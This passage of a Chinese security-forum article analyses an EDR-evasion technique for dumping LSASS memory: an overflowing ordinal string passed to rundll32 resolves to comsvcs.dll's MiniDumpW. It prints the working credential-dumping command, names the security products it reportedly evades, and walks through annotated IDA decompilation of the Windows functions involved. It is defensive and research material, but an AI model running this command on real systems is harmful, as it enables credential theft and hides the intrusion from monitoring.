---
title: 【先知】利用整数溢出绕过 EDR 实现 LSASS 进程内存转储
source: https://xz.aliyun.com/news/92705
source_host: xz.aliyun.com
clip_date: 2026-08-20T14:44:20+08:00
trace_id: 727832c5-752e-4159-a0ee-ae7bc68af75a
content_hash: f90cc6a691d2f5e4751b484631b45c2d59138f4f354ef3d3b04843312d27d383
status: synced
tags:
  - 先知
  - Windows逆向
  - EDR绕过
series: null
feed_source: 先知安全技术社区
ai_summary: LSASS内存转储可通过“超长负数+整数溢出”让 `_wtoi` 返回24，借 `rundll32` 调用 `comsvcs.dll!MiniDumpW`，从而绕过部分EDR检测。
ai_summary_style: key-points
images_status:
  total: 25
  succeeded: 25
  failed_urls: []
notion_page_id: 3c275244-d011-8135-bc71-f5c37f9e8f25
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> LSASS内存转储可通过“超长负数+整数溢出”让 `_wtoi` 返回24，借 `rundll32` 调用 `comsvcs.dll!MiniDumpW`，从而绕过部分EDR检测。
> 
> - **核心攻击链：** 命令行 `rundll32 "comsvcs.dll,#-999...976" <pid> dump.bin full` 中，超长数字经 `_wtoi` 溢出后恰好等于 `MiniDumpW` 的导出序号24，`GetProcAddress` 按序号解析出真实函数并执行完整转储。
> - **绕过手法：** 不明文出现 `MiniDump` 或 `#24` 等敏感模式；使用微软签名的 `rundll32.exe`（LOLBins）降低拦截概率；文章实测可过虎符与数字核晶，卡巴暂未绕过。
> - **溢出根源：** `_wtoi` → `wcstolX` → `wcstoxlX` 调用链中，`_wtoi` 传入 `a6=1` 使溢出检查被绕过，累加器按 `v11=(v11*10+digit) mod 2^32` 持续计算；对负数字符串最后执行 `-v11`，目标数值 `0xFFFFFFE8` 取负后即得24。
> - **逆向结论：** `comsvcs.dll` 导出 `MiniDumpW`（序号24），内部解析 `"PID 路径 full"` 参数并调用 `MiniDumpWriteDump`；`rundll32` 的 `_FindCommandFunction` 对 `#` 开头入口点走序号路径，返回值经 `movzx edx, ax` 截断为16位后交给 `GetProcAddress`。
> - **代码实现：** 文末C++程序先构造 `k*2^32 + 0xFFFFFFE8` 形式的负数，再拼接完整 `rundll32` 命令行，并自带 `wtoi_overflow()` 校验逻辑，不依赖固定的 `-999...976` 字符串。

-   参考文章： [https://xz.aliyun.com/news/92289](https://xz.aliyun.com/news/92289)
-   目前测试可过虎符和数字核晶，卡巴暂时干不动

## 一、实现方式

-   把lsass进程（此时PID为680）的完整内存转储到dump.bin文件中，拿到dump文件后，用mimikatz等工具提取密码哈希

```html
rundll32 "C:\Windows\System32\comsvcs.dll,#-9999999999999999999999999999999976" 680 dump.bin full
```

-   C++实现的代码放在文末了（AI写的）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d1a86a523020a947.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/512f46eac8037315.png)

-   可能绕过的点

-   不出现 `MiniDump` 字符串：用 `#-9999999999999999999999999999999976` 代替函数名
-   利用 `rundll32.exe` （LOLBins）：Windows自带的微软签名程序，杀软不拦截
-   利用整数溢出：超长数字经过 `_wtoi` 内部的溢出运算后恰好等于 `MiniDumpW` 的导出序号 `24`

## 二、前置知识

-   这个章节的知识只是作为了解，后续会在IDA Pro展示逆向分析过程

## 分析路线

|     |     |     |
| --- | --- | --- |  
| 问题  | 文件  | 核心函数 |
| dump是怎么实现的 | `comsvcs.dll` | `MiniDumpW` (ordinal 24) |
| `#-999...976` 怎么变成函数调用的 | `rundll32.exe` | `_FindCommandFunction` |
| 超长数字怎么变成24的？ | `msvcrt.dll` | `_wtoi`  <br>→ `wcstolX`  <br>→ `wcstoxlX` |

```plain
用户执行命令
    │
    ▼
rundll32.exe (加载器)
    ├── 1. LoadLibraryExW("comsvcs.dll") → 加载目标 DLL
    ├── 2. _FindCommandFunction(hModule, "#-999...976")
    │       ├── 检测到 '#' → 走序号路径
    │       ├── 调用 msvcrt.dll!_wtoi("-999...976") → 内部溢出 → 返回 24
    │       ├── movzx edx, ax → edx = 24
    │       └── GetProcAddress(comsvcs.dll, 24) → 找到 MiniDumpW
    └── 3. 调用 MiniDumpW(hwnd, hinst, "680 dump.bin full")
            └── comsvcs.dll!MiniDumpW → MiniDumpWriteDump → lsass dump 完成
```

## 基础知识

### PE文件格式与DLL机制

-   Windows上所有的`.exe` 和`.dll` 都是PE文件。区别在于使用方式：

-   `.exe` ：可以独立运行。操作系统创建进程时，加载PE文件到内存，从入口点开始执行
-   `.dll` ：不能独立运行。它被某个`.exe` 通过 `LoadLibrary` （Windows API函数）加载到自己的进程空间后，才能使用其中的函数

-   `comsvcs.dll` 是一个DLL，虽然内部有 `MiniDumpW` 函数可以用于dumphash，但这个函数不会自己执行，必须通过`.exe` 程序把它加载进来，找到 `MiniDumpW` 函数的地址调用它

### 导出表

-   DLL会导出一些函数，意思是“这些函数是公开的，外部程序可以调用”，导出表记录了每个导出函数的三种信息：

-   函数名（Name）：如 `MiniDumpW`
-   序号（Ordinal）：如 `24` ，是数字编号
-   地址（Address）：函数在内存中的实际位置，如 `0x1800272B0`

-   函数名和序号是等价的查找方式，就像在公司里找人可以叫名字也可以叫工号
-   `comsvcs.dll` 导出了 `MiniDumpW` ，序号是24，所以最终要做的就是让 `GetProcAddress` 拿着24去 `comsvcs.dll` 里找到这个函数，但不在命令行里直接写 `#24` （杀软可能匹配 `#24` 这个模式），所以要找一个看起来无害的数字，经过溢出运算后恰好变成24

### 导入表

-   EXE或DLL会导入其他DLL的函数，导入表记录了：

-   从哪个DLL导入
-   导入了哪些函数

-   PE文件加载到内存时，Windows加载器会：

-   加载依赖的DLL → 查找每个导入函数的实际地址 → 把地址填入IAT（导入地址表）
-   之后代码中通过 `call cs:__imp__wtoi` 调用导入函数（ `__imp__wtoi` 是IAT 中的一个条目，存着 `_wtoi` 在 `msvcrt.dll` 中的实际地址）

-   `rundll32.exe` 的导入表里有 `_wtoi` ，说明它需要调用这个函数，通过追踪谁调用了 `_wtoi` ，就能找到处理 `#` 后面数字的代码

### GetProcAddress的核心规则

-   `GetProcAddress` 是Windows API中的一个函数，用于从DLL中获取指定导出函数或变量的地址通常与 `LoadLibrary` 或 `LoadLibraryEx` 一起使用，后者用于加载DLL文件
-   函数原型如下： [https://learn.microsoft.com/zh-cn/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress](https://learn.microsoft.com/zh-cn/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)

```c
FARPROC GetProcAddress(
  [in] HMODULE hModule,
  [in] LPCSTR  lpProcName
);
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8ff239d797d550dd.png)

-   `lpProcName` 参数解释

-   `lpProcName` 的类型是 `LPCSTR` （ `const char *` ，指针），但 `GetProcAddres` 需要支持传序号（一个小整数），怎么区分一个值是指针还是序号，规则如下
-   如果 `lpProcName` 的高16位为 0，当作序号处理；否则当作指向函数名字符串的指针（字符串指针不会小于65536，而序号通常是小数字（0-65535），高16位为0）

|     |     |     |     |
| --- | --- | --- | --- |   
| 调用方式 | `lpProcName` 的值 | 高16位 | 解释  |
| `GetProcAddress(h, "MiniDumpW")` | 如 `0x000002004F300020` | 非零  | 按函数名查找 |
| `GetProcAddress(h, (LPCSTR)24)` | `0x0000000000000018` | `0x0000` | 按序号24查找 |

-   `rundll32` 调用 `GetProcAddress` 时传的值来自 `_wtoi` 返回值经过 `movzx edx, ax` 处理， `movzx` 取低16位并零扩展，保证高位为0，所以 `GetProcAddress` 会按序号查找（ `_wtoi` 返回值 → `movzx` 截断 → `GetProcAddress` 按序号）

### 整数溢出与模运算

-   32位无符号整数（ `unsigned int` ）范围是 `0到(2^{32}-1) = 4,294,967,295` ，超过这个范围不会报错，而是自动丢弃溢出的高位，只保留低32位（模运算）

```plain
实际结果 = 数学结果 mod 2^32
```

### rundll32的工作方式

-   `rundll32.exe` 是Windows自带工具，可以加载指定DLL并调用其中的导出函数

```plain
rundll32 <DLL路径>,<入口点> [参数]
```

-   入口点有两种写法：

|     |     |     |
| --- | --- | --- |  
| 写法  | 示例  | rundll32 的处理 |
| 函数名 | `MiniDumpW` | `GetProcAddress(hModule, "MiniDumpW")` 按名称查找 |
| `#` 加序号 | `#24` | `_wtoi("#后面的字符串")` 转数字 → `GetProcAddress(hModule, 数字)` 按序号查找 |

-   rundll32看到 `#` 开头的入口点时，调用 `_wtoi` 转换 `#` 后面的字符串，这个 `_wtoi` 调用就是触发整数溢出的地方

### 宽字符与ASCII

-   Windows内部使用UTF-16LE编码的宽字符（ `wchar_t` ，2字节/字符），C语言标准字符串（ `char` ，1字节/字符）使用ASCII或UTF-8
-   `_wtoi` 的输入是 `wchar_t *` （宽字符串，Windows 命令行参数是宽字符）， `GetProcAddress` 的 `lpProcName` 是 `LPCSTR` （ASCII字符串，导出函数名用ASCII存储），rundll32在函数名路径中需要用 `WideCharToMultiByte` 转换，但在序号路径中不需要（因为序号是数字不是字符串）

## 三、IDA Pro逆向分析

## 分析comsvcs.dll（找到dump的实现）

-   目标：确认 `comsvcs.dll` 导出了 `MiniDumpW` ，找到它的序号和地址，分析它内部如何调用 `MiniDumpWriteDump`

### 文件路径

```plain
C:\Windows\System32\comsvcs.dll
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/d1fc83ceab13edb3.png)

### 查看导出表，找到MiniDumpW

-   操作： `View` → `Open Subviews` → `Exports`
-   此时可以看到 `MiniDumpW` 导出序号为24，地址为 `0x1800272B0` ，函数大小为 `743` 字节

-   序号 `24` 是本文实现hashdump的目标值，需要让 `_wtoi` 的溢出结果恰好等于 `24` （这个 `24` 后面会反复出现，现在先记住它）
-   `W` 后缀：Windows API有两个版本： `NameW` （Unicode/Wide，处理 `wchar_t` 和 `NameA` （ANSI，处理 `char` ）， `rundll32` 用函数名查找时会自动先尝试加 `W` ，再尝试加 `A` （这个逻辑在后续分析中会看到）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/a4caa3973bce18a5.png)

### 跳转到MiniDumpW并反编译

-   操作：在导出表中双击 `MiniDumpW` → IDA跳转到 `0x1800272B0` → 按 `F5` 反编译

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/bc5e281eda5c6a2c.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/c558dc505f049e61.png)

-   反编译代码（关键代码注释）

```c
// Hidden C++ exception states: #wind=1
void __fastcall MiniDumpW(__int64 a1, __int64 a2, const WCHAR *a3)
{
  void *v4;                         // 输出文件句柄
  signed int v5;                   // 临时错误码
  signed int v6;                   // 最终 HRESULT/错误码
  wchar_t *v7;                     // 第一个空格位置
  wchar_t *v8;                     // 保存第一个空格位置
  wchar_t *v9;                     // 第二个空格位置
  BOOL v10;                         // 是否执行 Full Dump
  DWORD v11;                        // 目标进程 PID
  HANDLE v12;                       // 目标进程句柄
  unsigned __int16 v13, v14;        // SetControl() 参数，反编译未正确恢复
  HANDLE FileW;                     // Dump 文件句柄
  signed int LastError;             // GetLastError() 返回值

  struct _SECURITY_ATTRIBUTES SecurityAttributes;
  _BYTE v18[40];
  __int64 v19;
  __int64 v20;

  // 保存展开环境变量后的输入字符串
  // 预期格式类似：
  // "780 C:\\dump.dmp full"
  WCHAR Dst[520];

  v20 = -2;
  v4 = 0;

  memset_0(Dst, 0, sizeof(Dst));
  *(_OWORD *)&SecurityAttributes.lpSecurityDescriptor = 0;
  memset(v18, 0, sizeof(v18));
  v19 = 0;

  // 展开输入字符串中的环境变量，例如 %TEMP%
  if ( !ExpandEnvironmentStringsW(a3, Dst, 0x207u) )
    goto LABEL_2;

  // 找到第一个空格，将字符串拆成：
  //
  // Dst     = PID
  // v8 + 1  = Dump 文件路径
  // v9 + 1  = Dump 类型
  //
  // 例如：
  // "780 C:\\dump.dmp full"
  //
  // 拆分后：
  // Dst      -> "780"
  // v8 + 1   -> "C:\\dump.dmp"
  // v9 + 1   -> "full"
  v7 = wcschr(Dst, 0x20u);
  v8 = v7;

  if ( !v7 || (*v7 = 0, (v9 = wcschr(v7 + 1, 0x20u)) == 0) )
  {
    // 参数格式错误：E_INVALIDARG
    v6 = -2147024809;
    goto LABEL_19;
  }

  // 第二个空格替换为字符串结束符，
  // 从而得到第三个参数
  *v9 = 0;

  // 判断第三个参数是否为 "full"
  // 是：执行完整内存 Dump
  // 否：执行普通 MiniDump
  v10 = _wcsicmp(v9 + 1, L"full") == 0;

  // 将第一个参数 PID 字符串转换成 DWORD
  v11 = _wtoi(Dst);

  // 打开目标进程
  //
  // 0x410 = PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
  v12 = OpenProcess(0x410u, 0, v11);

  if ( v12 )
  {
    // 初始化安全描述符
    v6 = CSecDesc::Initialize((CSecDesc *)&v18[8]);

    if ( v6 >= 0 )
    {
      // 允许 SYSTEM 账户访问
      v6 = CSecDesc::Allow(
              (CSecDesc *)&v18[8],
              &CSid::x_sidSystem,
              0x101F0000u,
              1u);

      if ( v6 >= 0 )
      {
        // 允许本地 Administrators 组访问
        v6 = CSecDesc::Allow(
                (CSecDesc *)&v18[8],
                &CSid::x_sidLocalAdministrators,
                0x101F0000u,
                1u);

        if ( v6 >= 0 )
        {
          // 设置安全描述符控制属性
          // v13/v14 的真实含义需要结合原始函数定义确认
          v6 = CSecDesc::SetControl(
                  (CSecDesc *)&v18[8],
                  v13,
                  v14);

          if ( v6 >= 0 )
          {
            // 初始化 SECURITY_ATTRIBUTES
            SecurityAttributes.nLength = 24;

            // 指定前面创建的安全描述符
            SecurityAttributes.lpSecurityDescriptor =
                *(PVOID *)&v18[8];

            // 不允许句柄被子进程继承
            SecurityAttributes.bInheritHandle = FALSE;

            // 创建 Dump 文件
            //
            // v8 + 1 = 输出文件路径
            //
            // 0xC0000000 = GENERIC_READ | GENERIC_WRITE
            // 1         = FILE_SHARE_READ
            // 1         = CREATE_NEW
            // 0x80      = FILE_ATTRIBUTE_NORMAL
            FileW = CreateFileW(
                      v8 + 1,
                      0xC0000000,
                      1u,
                      (LPSECURITY_ATTRIBUTES)&SecurityAttributes,
                      1u,
                      0x80u,
                      0);

            v4 = FileW;

            // 调用 MiniDumpWriteDump 对目标进程进行转储
            //
            // full：
            //     MiniDumpWithHandleData
            //     |
            //     MiniDumpWithFullMemory
            //
            // 非 full：
            //     MiniDumpNormal
            if ( FileW == (HANDLE)-1LL
              || !MiniDumpWriteDump(
                    v12,                          // 目标进程句柄
                    v11,                          // PID
                    FileW,                        // Dump 文件句柄
                    v10
                      ? MiniDumpWithHandleData |
                        MiniDumpWithFullMemory
                      : MiniDumpNormal,
                    0,
                    0,
                    0) )
            {
              // 获取失败原因
              LastError = GetLastError();
              v6 = LastError;

              // Win32 Error → HRESULT
              // 例如：
              // ERROR_ACCESS_DENIED (5)
              // → 0x80070005
              if ( LastError > 0 )
                v6 = (unsigned __int16)LastError | 0x80070000;
            }
          }
        }
      }
    }

    // 关闭目标进程句柄
    CloseHandle(v12);

    // 关闭 Dump 文件句柄
    if ( v4 )
      CloseHandle(v4);
  }
  else
  {
LABEL_2:

    // OpenProcess() 失败，获取错误码
    v5 = GetLastError();
    v6 = v5;

    // Win32 Error → HRESULT
    if ( v5 > 0 )
      v6 = (unsigned __int16)v5 | 0x80070000;
  }

  // 如果执行过程中出现错误，直接退出进程
  if ( v6 < 0 )
LABEL_19:
    ExitProcess(v6);

  // 释放安全描述符对象
  CSecDesc::~CSecDesc((CSecDesc *)&v18[8]);
}
```

-   关键： `MiniDumpW` 的第三个参数 `a3` （cmdline）就是rundll32传过来的命令行参数。当用户执行 `rundll32 "comsvcs.dll,#24" 680 dump.bin full` 时， `680 dump.bin full` 这部分就作为 `a3` 传给了 `MiniDumpW`

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/65eb84118349afba.png)

-   MiniDumpWriteDump签名（来自 `dbghelp.dll` ）： `MiniDumpWithFullMemory` 会转储进程的完整内存，包括存储 `NTLM/Kerberos` 哈希的内存区域，这就是dump hash的原理

```c
// 函数原型
BOOL MiniDumpWriteDump(
 HANDLE hProcess,              // 目标进程句柄
 DWORD ProcessId,              // 进程 PID
 HANDLE hFile,                 // 输出文件句柄
 MINIDUMP_TYPE DumpType,       // dump 类型
 PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam,
 PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
 PMINIDUMP_CALLBACK_INFORMATION CallbackParam
);
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/06b1cdf800c5f883.png)

### MiniDumpW的工作流程

-   从反编译代码可以分析大致的执行顺序

```c
输入
PID + Dump路径 + Dump类型
例如：
"680 C:\dump.bin full"
        │
        ↓
ExpandEnvironmentStringsW()
展开环境变量
例如 %TEMP% → C:\Users\xxx\AppData\Local
        │
        ↓
wcschr()
按空格分割参数
        │
        ├── PID    → "680"
        ├── 路径   → "C:\dump.bin"
        └── 类型   → "full"
        │
        ↓
_wtoi()
将 PID 字符串转换为整数
"680" → 680
        │
        ↓
OpenProcess()
打开 PID = 680 的目标进程
(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)
        │
        ↓
CSecDesc::Initialize()
创建并初始化安全描述符
        │
        ↓
CSecDesc::Allow()
允许 SYSTEM 和 Administrators 访问
        │
        ↓
CreateFileW()
创建 Dump 输出文件
        │
        ↓
MiniDumpWriteDump()
执行真正的进程内存转储
        │
        ├── full
        │     ↓
        │   MiniDumpWithFullMemory
        │   + MiniDumpWithHandleData
        │
        └── 非 full
              ↓
            MiniDumpNormal
        │
        ↓
CloseHandle()
关闭进程句柄
关闭 Dump 文件句柄
        │
        ↓
CSecDesc::~CSecDesc()
释放安全描述符
        │
        ↓
完成
```

-   真正完成Dump的核心就是

```c
MiniDumpWriteDump(
    v12,                              // 目标进程
    v11,                              // PID
    FileW,                            // 输出文件
    v10
        ? MiniDumpWithHandleData |
          MiniDumpWithFullMemory      // full
        : MiniDumpNormal,             // 普通
    0,
    0,
    0
);
```

-   总的来说 `comsvcs.dll` 导出了 `MiniDumpW` ，它接收 `"PID 文件路径 类型"` 参数，内部调用 `MiniDumpWriteDump` 完成内存转储
-   现在我们知道目标函数是 `MiniDumpW` （序号24）。但实际我们执行的命令中没有写 `MiniDumpW` 也没有写 `#24` ，而是写了 `#-9999999999999999999999999999999976` ，这个超长数字是如何变成24的，我们需要分析 `rundll32.exe` ，看它怎么处理 `#` 后面的字符串

## 分析rundll32.exe（找到函数解析逻辑）

-   目标：理解rundll32如何解析 `#-9999999999999999999999999999999976` 这个入口点字符串，如何调用 `_wtoi` ，如何用结果调用 `GetProcAddress`

### 打开文件

-   文件路径

```c
C:\Windows\System32\rundll32.exe
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/9e3f8fb928a87ab1.png)

### 查看导入表

-   操作： `View` → `Open Subviews` → `Imports`
-   此时可以看到导入表中有三个关键函数，这说明 `rundll32` 会加载某个DLL，然后用 `_wtoi` 解析数字，接着用 `GetProcAddress` 查找函数

-   `_wtoi` （字符串转整数）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/8cca49d51f6d52a7.png)

```plain
- `LoadLibraryExW`（加载 DLL）
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/ce6c5d970535c6b1.png)

```plain
- `GetProcAddress`（查找导出函数）
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/0b998c88172fc650.png)

### 分析\_wtoi（找到调用者）

-   思路： `_wtoi` 比较特殊，普通的程序不一定需要字符串转整数，但 `rundll32` 需要它来解析 `#` 后面的序号，所以应该从 `_wtoi` 的调用者入手，找到处理 `#` 的代码
-   操作：

-   在导入表中双击 `_wtoi` （地址 `0x14000C890` ），IDA会跳转到该地址（IAT中的一个指针条目）

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/08ce98a43699a9a9.png)

```plain
- 在`__imp__wtoi`上按`X`（交叉引用），会弹出交叉引用列表，此时可以看到`_wtoi`被一个函数调用，该函数的符号名如下
```

```plain
?_FindCommandFunction@@YAP6AXPEAUHWND__@@PEAUHINSTANCE__@@PEBGH@Z12PEAH@Z
```

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/cd55b51792cca328.png)

### 反编译\_FindCommandFunction

-   操作：双击 `_FindCommandFunction` 函数名，进入汇编视图，然后 `F5` 反编译

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/2220d0d9b37cd406.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/1edb64c43985263e.png)

-   代码注释如下

```c
// 根据用户指定的命令字符串，在 DLL 中查找要执行的导出函数。
// 支持两种形式：
//   1. "#123"       -> 按 Ordinal 查找
//   2. "Function"   -> 依次尝试 FunctionW、FunctionA、Function
void (*__fastcall _FindCommandFunction(
        HINSTANCE hModule,
        LPCWCH lpWideCharStr,
        int *a3))(HWND, HINSTANCE, const unsigned __int16 *, int)
{
    FARPROC ProcAddress = 0;

    // 如果命令以 '#' 开头，例如 "#100"，
    // 则将后面的数字转换成 Ordinal，通过 GetProcAddress 按序号查找导出函数。
    if (*lpWideCharStr == '#' && lpWideCharStr[1])
    {
        unsigned __int16 ordinal = _wtoi(lpWideCharStr + 1);

        return (void (*)(HWND, HINSTANCE, const unsigned __int16 *, int))
            GetProcAddress(hModule, (LPCSTR)ordinal);
    }
    else
    {
        // 普通函数名：先计算 Unicode 字符串长度，
        // 然后转换成 ANSI 字符串，因为 GetProcAddress 接收 LPCSTR。
        __int64 len = -1;
        __int64 pos = -1;

        do
            ++len;
        while (lpWideCharStr[len]);

        int size = len + 1;

        CHAR *name = (CHAR *)LocalAlloc(0, 2 * size + 2);
        CHAR *buffer = name;

        if (name)
        {
            if (WideCharToMultiByte(
                    0, 0x400,
                    lpWideCharStr, size,
                    name, 2 * size,
                    0, 0))
            {
                // 找到 ANSI 字符串末尾，准备临时修改最后一个字符。
                do
                    ++pos;
                while (buffer[pos]);

                buffer[pos + 1] = 0;

                // 第一优先级：尝试 xxxW。
                // 例如输入 "Test"，首先查找 "TestW"。
                buffer[pos] = 'W';
                ProcAddress = GetProcAddress(hModule, buffer);

                if (!ProcAddress)
                {
                    // xxxW 不存在，则回退到 xxxA。
                    // a3 = 1 表示发生了 W -> A 的回退。
                    *a3 = 1;

                    buffer[pos] = 'A';
                    ProcAddress = GetProcAddress(hModule, buffer);

                    if (!ProcAddress)
                    {
                        // xxxA 也不存在，最后尝试不带后缀的原始函数名。
                        buffer[pos] = 0;
                        ProcAddress = GetProcAddress(hModule, buffer);
                    }
                }
            }

            LocalFree(buffer);
        }
    }

    // 返回最终找到的导出函数地址；如果全部查找失败则返回 NULL。
    return (void (*)(HWND, HINSTANCE, const unsigned __int16 *, int))
        ProcAddress;
}
```

### \_FindCommandFunction的两条路径

-   这个函数有两条执行路径，取决于入口点字符串的首字符：

-   路径一（序号路径）：首字符是 `#`

-   跳过 `#` ，取后面的字符串
-   调用 `_wtoi` 把字符串转成整数
-   用该整数作为ordinal（序号）调用 `GetProcAddress`

-   路径二（函数名路径）：首字符不是 `#`

-   把宽字符函数名转成ANSI
-   依次尝试 `name+W` 、 `name+A` 、原始 `name` 调用 `GetProcAddress`

```c
输入：DLL句柄 + 命令字符串
             │
             ▼
      是否是 "#Ordinal"？
        ┌────┴────┐
       是         否
       │           │
       ▼           ▼
按Ordinal查找   函数名查找
                   │
                   ▼
             FunctionW
                   │
                失败
                   ▼
             FunctionA
                   │
                失败
                   ▼
              Function
```

-   思考：本文中走的是路径一，关键在于 `_wtoi` 的返回值被当作ordinal传给 `GetProcAddress` ，如果 `_wtoi` 返回 `24` ， `GetProcAddress` 就按 `ordinal = 24` 查找，恰好是 `MiniDumpW`
-   但这里有个问题：从反编译代码可以看到， `_wtoi` 的返回值类型是 `int` （32位），但被赋值给 `unsigned __int16` （16位），这意味着只有低16位被保留

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/80c28bdad73fb7f1.png)

### 查看上层调用者

-   `_FindCommandFunction` 负责查找函数，但它接收的 `hModule` 从哪来？入口点字符串从哪来？找到函数后谁调用它？此时需要看上层调用者
-   操作：在 `_FindCommandFunction` 上按 `X` ，找到调用者 `_InitCommandInfo` ，然后双击进入 `_InitCommandInfo` 函数

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/84a56cdf3e7cb504.png)

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/08/6a6ef6dc1be67822.png)

-   代码注释如下

```c
__int64 __fastcall _InitCommandInfo(
        HINSTANCE a1,
        const unsigned __int16 *a2,
        const unsigned __int16 *a3,
        const unsigned __int16 *a4,
        HINSTANCE *a5,
        void (**a6)(HWND, HINSTANCE, const unsigned __int16 *, int),
        char **a7)
{
  void (*CommandFunction)(HWND, HINSTANCE, const unsigned __int16 *, int); // 最终要调用的 DLL 导出函数
  HINSTANCE v10;        // rundll32.exe 自身的模块句柄
  unsigned int v12;     // 函数最终返回值：1 表示成功，0 表示失败
  HMODULE Library;      // 目标 DLL 加载后的模块句柄
  DWORD LastError;      // LoadLibraryExW() 失败后的错误码
  DWORD v15;
  int v16;              // _FindCommandFunction() 返回的状态，表示是否回退到了 xxxA
  __int64 v17;
  int v18;
  CHAR *v19;             // 转换后的 ANSI 参数
  const unsigned __int16 *v20;
  unsigned int v21;
  int cbMultiByte[2];    // [0] 用于保存状态/转换所需字节数
  char **v24;
  HINSTANCE *v25;
  void (**v26)(HWND, HINSTANCE, const unsigned __int16 *, int);
  WCHAR v27[200];       // 错误信息缓冲区
  WCHAR Buffer[264];    // 系统错误信息缓冲区

  CommandFunction = 0;
  v10 = g_hInstance;

  /*
   * 初始化所有输出参数。
   *
   * a5：最终返回目标 DLL 的 HINSTANCE
   * a6：最终返回 DLL 导出函数地址
   * a7：如果调用的是 xxxA，则保存转换后的 ANSI 命令行参数
   */
  *a5 = 0;
  *a6 = 0;
  v12 = 0;
  *a7 = 0;

  v26 = a6;
  v24 = a7;
  v25 = a5;

  /*
   * 第一步：加载用户指定的 DLL。
   *
   * a2 就是 rundll32 命令行中指定的 DLL 路径。
   *
   * LOAD_WITH_ALTERED_SEARCH_PATH 会影响 DLL 的搜索路径，
   * rundll32 使用这个标志加载目标 DLL。
   */
  Library = LoadLibraryExW(a2, 0, 8u);

  if (!Library)
  {
    /*
     * DLL 加载失败。
     *
     * 这里首先获取具体的 Windows 错误码，然后根据错误码生成
     * 对应的错误信息，最后交给 _DisplayErrorMessage() 显示。
     */
    LastError = GetLastError();

    /*
     * 193 = ERROR_BAD_EXE_FORMAT。
     *
     * 在 rundll32 场景下，这个错误比较重要：
     * 常见情况是 rundll32 与目标 DLL 位数不匹配，例如：
     *
     *     32 位 rundll32 -> 加载 64 位 DLL
     *     64 位 rundll32 -> 加载 32 位 DLL
     *
     * 所以这里额外调用 _TryWow64Scenario()，
     * 尝试处理 WOW64/位数不匹配相关情况。
     */
    if (LastError == 193)
    {
      if ((unsigned int)_TryWow64Scenario(a2))
        return v12;

      /*
       * WOW64 场景处理失败后，使用错误码 0xC1
       * 生成对应的系统错误文本。
       */
      *(_QWORD *)cbMultiByte = a2;

      v15 = FormatMessageW(
              0x3000u,
              0,
              0xC1u,
              0,
              Buffer,
              0x104u,
              (va_list *)cbMultiByte);
    }
    else
    {
      /*
       * 其他错误直接根据 GetLastError() 返回的错误码
       * 获取系统对应的错误描述。
       */
      v15 = FormatMessageW(
              0x1200u,
              0,
              LastError,
              0,
              Buffer,
              0x104u,
              0);
    }

    /*
     * 获取 rundll32 自己资源中的错误提示字符串，
     * 然后将 DLL 路径、错误信息等交给 _DisplayErrorMessage()
     * 显示给用户。
     */
    if (v15 && LoadStringW(v10, 0x401u, v27, 200))
      _DisplayErrorMessage(
          v10,
          (unsigned int)a2,
          Buffer,
          v27);
  }

  /*
   * 如果 Library 非 NULL，说明目标 DLL 已经成功加载。
   *
   * 接下来进入真正的“解析命令”阶段：
   *
   *     DLL 已加载
   *         ↓
   *     查找指定导出函数
   *         ↓
   *     准备命令行参数
   */
  if (Library)
  {
    v16 = 0;
    cbMultiByte[0] = 0;

    /*
     * 第二步：查找 DLL 中需要执行的导出函数。
     *
     * 这里调用的就是前面分析过的 _FindCommandFunction()。
     *
     * 它内部支持：
     *
     *     "#123"
     *         -> 按 Ordinal 查找
     *
     *     "Function"
     *         -> FunctionW
     *         -> FunctionA
     *         -> Function
     *
     * cbMultiByte[0] 会被 _FindCommandFunction() 用作状态值：
     *
     *     0 -> 没有发生 W -> A 回退
     *     1 -> FunctionW 不存在，最终尝试 FunctionA
     */
    if (a3)
    {
      CommandFunction = _FindCommandFunction(
          Library,
          a3,
          cbMultiByte);

      v16 = cbMultiByte[0];
    }

    /*
     * 如果成功找到了导出函数，CommandFunction 就是最终的函数地址。
     */
    if (CommandFunction)
    {
      v12 = 1;

      /*
       * 如果没有发生 W -> A 回退，
       * 或者根本没有提供命令行参数，
       * 就不需要进行额外的参数转换。
       *
       * 直接把 DLL 句柄和函数地址保存到输出参数，
       * 后续代码就可以直接调用这个函数。
       *
       * 只有在找到 xxxA，并且存在命令行参数时，
       * 才需要把 Unicode 参数转换成 ANSI。
       */
      if (!v16 || !a4 || !*a4)
        goto LABEL_20;

      /*
       * 由于最终找到的是 xxxA，
       * 后续调用的 DLL 函数期望接收 ANSI 字符串。
       *
       * 但是 rundll32 接收到的命令行参数 a4 是 Unicode 字符串，
       * 所以这里需要执行：
       *
       *     Unicode 参数
